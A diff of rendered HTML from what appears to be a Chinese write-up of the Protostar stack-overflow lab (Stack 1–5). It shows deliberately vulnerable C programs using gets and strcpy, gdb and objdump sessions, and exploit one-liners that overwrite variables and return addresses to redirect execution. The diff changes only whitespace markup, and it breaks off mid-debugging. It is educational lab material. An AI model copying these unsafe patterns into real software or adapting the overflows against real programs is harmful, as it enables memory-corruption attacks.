+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">modified</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 <h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ ./stack1 <span class="k">$(</span>python -c <span class="s1">&#39;print(&quot;A&quot; * 64 + &quot;dcba&quot;)&#39;</span><span class="k">)</span>
-you have correctly got the variable to the right value
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./stack1<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;A&quot; * 64 + &quot;dcba&quot;)&#39;</span><span class="k">)</span>
+you<span class="w"> </span>have<span class="w"> </span>correctly<span class="w"> </span>got<span class="w"> </span>the<span class="w"> </span>variable<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>right<span class="w"> </span>value
 </code></pre></div>
 <h2 id="stack-2">Stack 2<a class="headerlink" href="#stack-2" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">modified</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">variable</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">modified</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">variable</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">variable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;GREENIE&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">variable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;GREENIE&quot;</span><span class="p">);</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">variable</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">variable</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
-<span class="w">  </span><span class="n">modified</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">modified</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">variable</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">variable</span><span class="p">);</span>
 
 <span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">modified</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x0d0a0d0a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// &#39;\n\r\n\r&#39; in little endian</span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">modified</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">modified</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
-<span class="p">}</span><span class="w"></span>
+<span class="p">}</span>
 </code></pre></div>
 <h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ <span class="nv">GREENIE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s2">&quot;print(&#39;a&#39; * 64 + &#39;\n\r&#39; * 2)&quot;</span><span class="k">)</span> ./stack2
-you have correctly modified the variable
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="nv">GREENIE</span><span class="o">=</span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;a&#39; * 64 + &#39;\n\r&#39; * 2)&quot;</span><span class="k">)</span><span class="w"> </span>./stack2
+you<span class="w"> </span>have<span class="w"> </span>correctly<span class="w"> </span>modified<span class="w"> </span>the<span class="w"> </span>variable
 </code></pre></div>
 <h2 id="stack-3">Stack 3<a class="headerlink" href="#stack-3" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>overwriting function pointers stored on the stack</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-<span class="w">  </span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">fp</span><span class="p">);</span><span class="w"></span>
-<span class="w">      </span><span class="n">fp</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">fp</span><span class="p">);</span>
+<span class="w">      </span><span class="n">fp</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x win
-0x8048424 &lt;win&gt;:    0x83e58955
-<span class="o">(</span>gdb<span class="o">)</span> p win <span class="c1"># print the value of expression</span>
-<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>void <span class="o">(</span>void<span class="o">)}</span> 0x8048424 &lt;win&gt;
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>win
+0x8048424<span class="w"> </span>&lt;win&gt;:<span class="w">    </span>0x83e58955
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>p<span class="w"> </span>win<span class="w"> </span><span class="c1"># print the value of expression</span>
+<span class="nv">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span>void<span class="w"> </span><span class="o">(</span>void<span class="o">)}</span><span class="w"> </span>0x8048424<span class="w"> </span>&lt;win&gt;
 </code></pre></div>
 <h3 id="exploit_3">Exploit<a class="headerlink" href="#exploit_3" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print(&#39;a&#39; * 64 + &#39;\x24\x84\x04\x08&#39;)&quot;</span> <span class="p">|</span> ./stack3
-calling <span class="k">function</span> pointer, jumping to 0x08048424
-code flow successfully changed
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;a&#39; * 64 + &#39;\x24\x84\x04\x08&#39;)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./stack3
+calling<span class="w"> </span><span class="k">function</span><span class="w"> </span>pointer,<span class="w"> </span>jumping<span class="w"> </span>to<span class="w"> </span>0x08048424
+code<span class="w"> </span>flow<span class="w"> </span>successfully<span class="w"> </span>changed
 </code></pre></div>
 <h2 id="stack-4">Stack 4<a class="headerlink" href="#stack-4" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>overwriting saved EIP</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
@@ -3110,26 +3124,26 @@ code flow successfully changed
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;Z&#39;</span><span class="p">)):</span>
     <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/stack.py &gt; /tmp/test
-$ gdb ./stack4
-<span class="o">(</span>gdb<span class="o">)</span> r &lt; /tmp/test
-Starting program: /opt/protostar/bin/stack4 &lt; /tmp/test
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/stack.py<span class="w"> </span>&gt;<span class="w"> </span>/tmp/test
+$<span class="w"> </span>gdb<span class="w"> </span>./stack4
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span>&lt;<span class="w"> </span>/tmp/test
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack4<span class="w"> </span>&lt;<span class="w"> </span>/tmp/test
 
-Program received signal SIGSEGV, Segmentation fault.
-0x54545454 <span class="k">in</span> ?? <span class="o">()</span> <span class="c1"># T</span>
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x54545454<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="c1"># T</span>
 </code></pre></div>
 </li>
 <li>
 <p>获取函数 <code>win</code> 的地址</p>
-<div class="highlight"><pre><span></span><code>$ objdump -t stack4 <span class="p">|</span> grep win
-080483f4 g     F .text  <span class="m">00000014</span>              win
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>objdump<span class="w"> </span>-t<span class="w"> </span>stack4<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>win
+080483f4<span class="w"> </span>g<span class="w">     </span>F<span class="w"> </span>.text<span class="w">  </span><span class="m">00000014</span><span class="w">              </span>win
 </code></pre></div>
 </li>
 </ul>
 <h3 id="exploit_4">Exploit<a class="headerlink" href="#exploit_4" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print(&#39;a&#39; * 19 * 4 + &#39;\xf4\x83\x04\x08&#39;)&quot;</span> <span class="p">|</span> ./stack4
-code flow successfully changed
-Segmentation fault
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;a&#39; * 19 * 4 + &#39;\xf4\x83\x04\x08&#39;)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./stack4
+code<span class="w"> </span>flow<span class="w"> </span>successfully<span class="w"> </span>changed
+Segmentation<span class="w"> </span>fault
 </code></pre></div>
 <ul>
 <li>
@@ -3144,17 +3158,17 @@ Segmentation fault
 <blockquote>
 <p>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
@@ -3163,77 +3177,77 @@ Segmentation fault
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;Z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
     <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/stack.py &gt; /tmp/test
-$ gdb ./stack5
-<span class="o">(</span>gdb<span class="o">)</span> disassemble main
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-0x080483c4 &lt;main+0&gt;:    push   %ebp
-0x080483c5 &lt;main+1&gt;:    mov    %esp,%ebp
-0x080483c7 &lt;main+3&gt;:    and    <span class="nv">$0</span>xfffffff0,%esp
-0x080483ca &lt;main+6&gt;:    sub    <span class="nv">$0</span>x50,%esp
-0x080483cd &lt;main+9&gt;:    lea    0x10<span class="o">(</span>%esp<span class="o">)</span>,%eax
-0x080483d1 &lt;main+13&gt;:   mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
-0x080483d4 &lt;main+16&gt;:   call   0x80482e8 &lt;gets@plt&gt;
-0x080483d9 &lt;main+21&gt;:   leave  
-0x080483da &lt;main+22&gt;:   ret    
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080483da <span class="c1"># ret</span>
-<span class="o">(</span>gdb<span class="o">)</span> define hook-stop
-Type commands <span class="k">for</span> definition of <span class="s2">&quot;hook-stop&quot;</span>.
-End with a line saying just <span class="s2">&quot;end&quot;</span>.
-&gt;x/1i <span class="nv">$eip</span>
-&gt;x/8wx <span class="nv">$esp</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/stack.py<span class="w"> </span>&gt;<span class="w"> </span>/tmp/test
+$<span class="w"> </span>gdb<span class="w"> </span>./stack5
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>main
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>main:
+0x080483c4<span class="w"> </span>&lt;main+0&gt;:<span class="w">    </span>push<span class="w">   </span>%ebp
+0x080483c5<span class="w"> </span>&lt;main+1&gt;:<span class="w">    </span>mov<span class="w">    </span>%esp,%ebp
+0x080483c7<span class="w"> </span>&lt;main+3&gt;:<span class="w">    </span>and<span class="w">    </span><span class="nv">$0</span>xfffffff0,%esp
+0x080483ca<span class="w"> </span>&lt;main+6&gt;:<span class="w">    </span>sub<span class="w">    </span><span class="nv">$0</span>x50,%esp
+0x080483cd<span class="w"> </span>&lt;main+9&gt;:<span class="w">    </span>lea<span class="w">    </span>0x10<span class="o">(</span>%esp<span class="o">)</span>,%eax
+0x080483d1<span class="w"> </span>&lt;main+13&gt;:<span class="w">   </span>mov<span class="w">    </span>%eax,<span class="o">(</span>%esp<span class="o">)</span>
+0x080483d4<span class="w"> </span>&lt;main+16&gt;:<span class="w">   </span>call<span class="w">   </span>0x80482e8<span class="w"> </span>&lt;gets@plt&gt;
+0x080483d9<span class="w"> </span>&lt;main+21&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x080483da<span class="w"> </span>&lt;main+22&gt;:<span class="w">   </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x080483da<span class="w"> </span><span class="c1"># ret</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>define<span class="w"> </span>hook-stop
+Type<span class="w"> </span>commands<span class="w"> </span><span class="k">for</span><span class="w"> </span>definition<span class="w"> </span>of<span class="w"> </span><span class="s2">&quot;hook-stop&quot;</span>.
+End<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>line<span class="w"> </span>saying<span class="w"> </span>just<span class="w"> </span><span class="s2">&quot;end&quot;</span>.
+&gt;x/1i<span class="w"> </span><span class="nv">$eip</span>
+&gt;x/8wx<span class="w"> </span><span class="nv">$esp</span>
 &gt;end
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r &lt; /tmp/test
-Starting program: /opt/protostar/bin/stack5 &lt; /tmp/test
-0x80483da &lt;main+22&gt;:    ret    
-0xbffff6ac: 0x54545454  0x55555555  0x56565656  0x57575757
-0xbffff6bc: 0x58585858  0x59595959  0x5a5a5a5a  0xb7ffef00
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span>&lt;<span class="w"> </span>/tmp/test
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack5<span class="w"> </span>&lt;<span class="w"> </span>/tmp/test
+0x80483da<span class="w"> </span>&lt;main+22&gt;:<span class="w">    </span>ret<span class="w">    </span>
+0xbffff6ac:<span class="w"> </span>0x54545454<span class="w">  </span>0x55555555<span class="w">  </span>0x56565656<span class="w">  </span>0x57575757
+0xbffff6bc:<span class="w"> </span>0x58585858<span class="w">  </span>0x59595959<span class="w">  </span>0x5a5a5a5a<span class="w">  </span>0xb7ffef00
 
-Breakpoint <span class="m">1</span>, 0x080483da <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>Cannot access memory at address 0x5353535b
-<span class="o">)</span> at stack5/stack5.c:11
-<span class="m">11</span>  stack5/stack5.c: No such file or directory.
-  <span class="k">in</span> stack5/stack5.c
-<span class="o">(</span>gdb<span class="o">)</span> si
-Cannot access memory at address 0x53535357
-<span class="o">(</span>gdb<span class="o">)</span> si
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x080483da<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span>Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x5353535b
+<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>stack5/stack5.c:11
